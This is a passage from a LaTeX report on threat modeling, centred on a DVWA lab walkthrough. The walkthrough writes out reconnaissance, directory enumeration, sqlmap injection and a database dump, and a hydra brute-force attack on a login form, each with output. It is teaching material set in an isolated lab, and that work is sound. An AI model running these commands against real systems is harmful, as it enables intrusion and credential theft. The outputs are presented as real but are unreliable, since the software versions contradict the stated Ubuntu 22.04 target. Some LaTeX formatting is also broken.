\begin{itemize}
	\item Integrate threat modeling into DevSecOps pipelines
	\item Schedule regular reviews and updates
	\item Track metrics (e.g., number of threats mitigated, time to remediation)
	\item Foster a security-aware culture through training and awareness
\end{itemize}

\subsection*{6. Academic Perspective and Further Reading}
For deeper understanding, refer to:
\begin{itemize}
	\item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
	\item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
	\item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
	\item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Lab: Practical Threat Modeling with Linux Commands}

% Lab Chapter: Expanded and Enhanced
\subsection*{1. Introduction: Hands-On Threat Modeling and Exploitation}
This lab provides a comprehensive, step-by-step walkthrough of threat modeling and exploitation using the Damn Vulnerable Web Application (DVWA)\cite{owasp}. The approach follows industry best practices\cite{shostack2014,uceda2015} and demonstrates both offensive and defensive techniques, with technical explanations and real command outputs. By combining theoretical concepts with hands-on exercises, the lab helps participants develop a deep understanding of how attackers operate and how defenders can respond effectively.

\subsection*{2. Lab Setup and Architecture}
The lab environment consists of a target system (DVWA running on Ubuntu 22.04, IP: 192.168.56.101) and an attacker system (Kali Linux VM equipped with tools such as nmap, gobuster, sqlmap, nikto, and hydra). The systems are connected via an isolated VirtualBox NAT network, ensuring that attacks are contained and do not affect external resources. This setup provides a realistic simulation of a typical penetration testing scenario, allowing participants to explore both offensive and defensive security techniques in a controlled environment.
\begin{itemize}
    \item \textbf{Target:} DVWA running on Ubuntu 22.04 (IP: 192.168.56.101)
    \item \textbf{Attacker:} Kali Linux VM with nmap, gobuster, sqlmap, nikto, hydra
    \item \textbf{Network:} Isolated VirtualBox NAT network
\end{itemize}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.7\textwidth]{images/system-context}
    \caption{Lab Network and System Context Diagram}
\end{figure}

\subsection*{3. Step 1: Reconnaissance and Enumeration}
Reconnaissance is the process of gathering information about the target system, including open ports, services, and technologies\cite{nist800154}. The following commands are used to discover open ports and services:
\begin{verbatim}
$ nmap -sV -T4 -p- 192.168.56.101
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.18.04.1
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox)
\end{verbatim}
To identify web technologies in use, the following command is executed:
\begin{verbatim}
$ whatweb http://192.168.56.101
http://192.168.56.101 [200 OK] Apache[2.4.41], PHP[7.4.3], MySQL[5.7.33], Ubuntu[22.04]
\end{verbatim}

\subsection*{4. Step 2: Directory and File Enumeration}
Directory enumeration is used to identify hidden files and directories that may expose sensitive functionality\cite{owasp}. The gobuster tool is used as follows:
\begin{verbatim}
$ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
/login.php (Status: 200)
/config (Status: 301)
/uploads (Status: 301)
\end{verbatim}
This step helps uncover potential entry points for attackers and informs subsequent vulnerability assessments.

\subsection*{5. Step 3: Vulnerability Scanning}
Vulnerability scanning is the automated process of identifying known security weaknesses\cite{nist800154}. The following commands are used to scan for SQL injection and other web vulnerabilities:
\begin{verbatim}
$ sqlmap -u "http://192.168.56.101/login.php" --forms --batch
[INFO] testing connection to the target URL
[INFO] testing if the target URL is stable
[INFO] testing for SQL injection on POST parameter 'username'
[PAYLOAD] username=admin' AND 1=1-- &password=pass
[RESULT] The parameter 'username' appears to be injectable!
\end{verbatim}
To scan for XSS and other vulnerabilities, the following command is used:
\begin{verbatim}
$ nikto -h http://192.168.56.101
- Nikto v2.1.6
- Target IP:          192.168.56.101
- Target Hostname:    192.168.56.101
- Server: Apache/2.4.41 (Ubuntu)
[+] Cookie PHPSESSID created without the HttpOnly flag
[+] X-Frame-Options header is not present.
[+] The X-XSS-Protection header is not defined.
\end{verbatim}

\subsection*{6. Step 4: Exploitation}
	extbf{Definition:} Exploitation is the act of leveraging vulnerabilities to gain unauthorized access or extract data\cite{shostack2014}.

	extbf{Exploit SQL injection:}
\begin{verbatim}
$ sqlmap -u "http://192.168.56.101/login.php" --dump
[INFO] fetching database users
Database: dvwa
Table: users
admin | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@dvwa.local
\end{verbatim}

	extbf{Brute-force login:}
\begin{verbatim}
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=incorrect"
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
\end{verbatim}

\subsection*{7. Step 5: Mitigation and Hardening}
	extbf{Definition:} Mitigation involves applying security controls to reduce risk and prevent exploitation\cite{uceda2015}.
\begin{itemize}
    \item Patch and update all software components
    \item Enforce strong authentication (MFA, password policy)
    \item Use parameterized queries and ORM to prevent SQL injection
    \item Configure firewalls (e.g., ufw, iptables)
    \item Monitor logs for suspicious activity
    \item Set secure cookie flags (HttpOnly, Secure)
\end{itemize}

\subsection*{8. Lab Summary and Academic Perspective}
This lab demonstrates the end-to-end process of threat modeling, vulnerability discovery, exploitation, and mitigation in a controlled environment. The approach aligns with best practices from OWASP, NIST, and leading security literature\cite{owasp,shostack2014,uceda2015,nist800154}.
For deeper understanding, refer to:
\begin{itemize}
    \item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
    \item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
    \item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
    \item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Conclusion and Future Directions}

\section*{Conclusion and Future Directions}
Threat modeling is a cornerstone of modern cybersecurity, enabling organizations to proactively identify, analyze, and mitigate threats before they can be exploited\cite{shostack2014,uceda2015,owasp}. This report has covered the evolution of threat modeling, key frameworks (STRIDE, PASTA, Trike, VAST, OCTAVE, OWASP), practical methodologies, a real-world case study, and hands-on labs.

\subsection*{Key Takeaways}
\begin{itemize}
	\item Threat modeling should be integrated into every stage of the software development lifecycle (SDLC)\cite{shostack2014}.
	\item No single framework fits all needs; select based on context, risk, and organizational requirements\cite{uceda2015}.
	\item Collaboration between technical and business stakeholders is essential for effective risk management\cite{nist800154}.
	\item Continuous improvement and regular reviews are critical for staying ahead of evolving threats\cite{owasp}.
\end{itemize}

\subsection*{Emerging Trends}
\begin{itemize}
	\item AI-driven threat modeling and automated risk analysis\cite{owasp}
	\item Threat modeling for cloud-native, IoT, and supply chain security\cite{nist800154}
	\item Integration with DevSecOps and CI/CD pipelines\cite{owasp}
\end{itemize}

\subsection*{Actionable Recommendations}
\begin{itemize}
	\item Invest in training and awareness for all team members
	\item Use a combination of frameworks and tools for comprehensive coverage
	\item Share threat models and lessons learned with the security community
	\item Stay informed about new threats, vulnerabilities, and best practices\cite{owasp,shostack2014}
\end{itemize}

\subsection*{Final Thoughts}
Threat modeling is not a one-time activity but an ongoing process that adapts to new technologies, threats, and business needs. By adopting a structured, reference-driven approach, organizations can build more resilient systems and foster a culture of security.


\section{References}
\section*{References}
% This chapter will list all references cited throughout the document in a clean, academic format.
\begin{thebibliography}{99}
% Example reference entries (to be replaced with actual citations)
\bibitem{shostack2014} Adam Shostack. Threat Modeling: Designing for Security. Wiley, 2014.
\bibitem{uceda2015} Tony UcedaVélez and Marco M. Morana. Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis. Wiley, 2015.
\bibitem{owasp} OWASP Threat Modeling Cheat Sheet. \url{https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html}
\bibitem{nist800154} NIST SP 800-154: Guide to Data-Centric System Threat Modeling.
\bibitem{schneier1999} Bruce Schneier. Secrets and Lies: Digital Security in a Networked World. Wiley, 1999.
\end{thebibliography}


\end{document}
